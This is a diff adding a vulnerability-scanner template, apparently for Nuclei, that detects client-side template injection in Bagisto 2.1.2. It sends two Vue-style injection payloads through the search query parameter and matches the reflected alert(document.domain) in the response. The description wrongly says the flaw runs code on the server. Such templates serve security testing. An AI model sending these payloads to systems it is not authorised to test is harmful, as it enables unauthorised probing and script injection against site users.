@@ -1,0 +1,31 @@
+id: bagisto-csti
+
+info:
+  name: Bagisto 2.1.2 Client-Side Template Injection
+  author: securityforeveryone
+  severity: medium
+  description: |
+    Bagisto is vulnerable to Client-Side Template Injection (CSTI), which allows an attacker to execute arbitrary code on the server.
+  reference:
+    - https://packetstormsecurity.com/files/179153/Bagisto-2.1.2-Client-Side-Template-Injection.html
+    - https://demo.bagisto.com/
+  tags: packetstorm,bagisto,csti
+
+http:
+  - raw:
+      - |
+        GET /search?query={{_openBlock.constructor('alert(document.domain)')()}} HTTP/1.1
+        Host: {{Hostname}}
+
+  - raw:
+      - |
+        GET /search?query={{-function(){this.alert(document.domain)}()}} HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"alert(document.domain)","Search results")'
+          - 'status_code==200'
+        condition: and
